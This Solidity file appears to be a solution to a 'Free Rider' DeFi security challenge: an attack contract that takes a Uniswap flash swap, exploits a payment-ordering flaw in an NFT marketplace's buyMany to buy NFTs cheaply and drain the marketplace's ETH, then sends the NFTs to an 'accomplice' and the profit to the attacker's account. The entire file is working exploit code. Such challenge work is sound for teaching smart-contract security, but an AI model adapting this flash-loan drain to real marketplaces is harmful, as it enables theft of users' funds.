// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./AttackInterfaces.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract AttackOnFreeRider is IERC721Receiver, ReentrancyGuard {
    address private immutable owner;
    address private immutable accomplice;
    uint256 private constant WETH_TO_BORROW = 120 ether;
    uint256 private constant NFT_PRICE = 15 ether;

    IUniswapV2Pair immutable pair;
    IWeth immutable weth;
    IFreeRiderNFTMarketplace immutable marketplace;
    IERC721 nft;

    constructor(
        address _accomplice,
        IUniswapV2Pair _uniswapPair,
        IWeth _weth,
        IFreeRiderNFTMarketplace _marketplace,
        IERC721 _nft
    ) payable {
        owner = msg.sender;
        accomplice = _accomplice;
        pair = _uniswapPair;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
    }

    receive() external payable {}

    function initiateAttack() external {
        require(msg.sender == owner, "Only owner can call this");
        console.log("Initiating attack...");
        pair.swap(WETH_TO_BORROW, 0, address(this), "borrowweth");
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        if (stringsEquals(data, "borrowweth")) {
            require(amount0 == WETH_TO_BORROW, "Wrong amount");
            // get ETH instead of WETH
            uint256 attackerInitialBalance = address(owner).balance;
            console.log("WETH_TO_BORROW", WETH_TO_BORROW);
            console.log("amount0", amount0);
            console.log("amount1", amount1);
            console.log(
                "ETH balance of this contract before deposit:",
                address(this).balance
            );
            weth.withdraw(WETH_TO_BORROW);
            console.log(
                "ETH balance of this contract after deposit:",
                address(this).balance
            );
            // ACTIONS
            // BUY 2 NFTS for price of one NFT, ie 15 ethers
            uint256[] memory tokenIds = new uint256[](2);
            tokenIds[0] = 0;
            tokenIds[1] = 1;
            marketplace.buyMany{value: NFT_PRICE}(tokenIds);
            console.log(
                "ETH balance of this contract after the first buyMany:",
                address(this).balance
            );
            // LIST NFTS (set prices to max to drain the marketplace)
            uint256[] memory prices = new uint256[](2);
            uint256 totalMarketplaceBalance = address(marketplace).balance;
            prices[0] = totalMarketplaceBalance / 2;
            prices[1] = totalMarketplaceBalance / 2;
            // approve all NFTs
            nft.setApprovalForAll(address(marketplace), true);
            // offer NFTs
            marketplace.offerMany(tokenIds, prices);
            console.log(
                "ETH balance of marketplace before the attack",
                address(marketplace).balance
            );
            // BUY THE SAME NFTS AGAIN (the seller is this contracts, thus we will get all ETHs)
            marketplace.buyMany{value: totalMarketplaceBalance / 2}(tokenIds);
            console.log(
                "ETH balance of marketplace after the attack",
                address(marketplace).balance
            );
            console.log(
                "ETH balance of this contract after the attack:",
                address(this).balance
            );
            // NOW, BUY THE REST OF NFTS (again for price of one NFT)
            uint256[] memory remainingNFTs = new uint256[](4);
            remainingNFTs[0] = 2;
            remainingNFTs[1] = 3;
            remainingNFTs[2] = 4;
            remainingNFTs[3] = 5;
            // CALCULATE THE PRICE TO SENT:
            // ETH to be sent to the NFT owner: 15 * 4 = 60 ETH
            // Current amount of ETH in marketplace: 37.5
            // Price of one 1 NFT: 15 ETH
            // For successful purchase we need to send at at least:
            uint256 priceToPay = remainingNFTs.length *
                NFT_PRICE -
                address(marketplace).balance;
            marketplace.buyMany{value: priceToPay}(remainingNFTs);
            console.log(
                "ETH balance of this contract after buying the rest of NFTs:",
                address(this).balance
            );
            console.log(
                "ETH balance of marketplace after buying the rest of NFTs:",
                address(marketplace).balance
            );
            // TRANSFER ALL NFTS TO OUR ACCOMPLICE
            for (uint256 i; i < 6; i++) {
                nft.safeTransferFrom(address(this), accomplice, i);
            }
            console.log(
                "ETH balance of this contract after sending all NFTs to the accomplice:",
                address(this).balance
            );
            // REPAY
            // - calculate amount to repay
            uint256 amountRepay = (WETH_TO_BORROW * 1000) / 997 + 1;
            // - deposit ETH to WETH
            console.log("amountRepay to UniSwap", amountRepay);
            console.log(
                "ETH balance of this contract before flashloan repayment",
                address(this).balance
            );
            weth.deposit{value: amountRepay}();
            // - repay WETH
            bool success = weth.transfer(address(pair), amountRepay);
            require(success, "flashloan failed");
            console.log(
                "ETH balance of this contract after flashloan repayment",
                address(this).balance
            );
            // send eth to attackers EOA
            (bool attackSuccessful, ) = payable(address(owner)).call{
                value: address(this).balance
            }("");
            require(attackSuccessful, "ETH for owner not transfered");
            // check ETH balances before attack
            console.log(
                "ETH balance of this contract after sending ALL ETH to attacker's EOA",
                address(this).balance
            );
            uint256 attackerFinalBalance = address(owner).balance;
            console.log("attackerInitialBalance", attackerInitialBalance);
            console.log("attackerFinalBalance", attackerFinalBalance);
        }
    }

    // to be able to receive NFT from the Marketplace
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(nft), "Wrong NFT");
        return IERC721Receiver.onERC721Received.selector;
    }

    // Helpers
    function stringsEquals(
        bytes calldata s1,
        string memory s2
    ) private pure returns (bool) {
        bytes memory b1 = bytes(s1);

        bytes memory b2 = bytes(s2);

        uint256 l1 = b1.length;
        if (l1 != b2.length) return false;
        for (uint256 i = 0; i < l1; i++) {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }
}
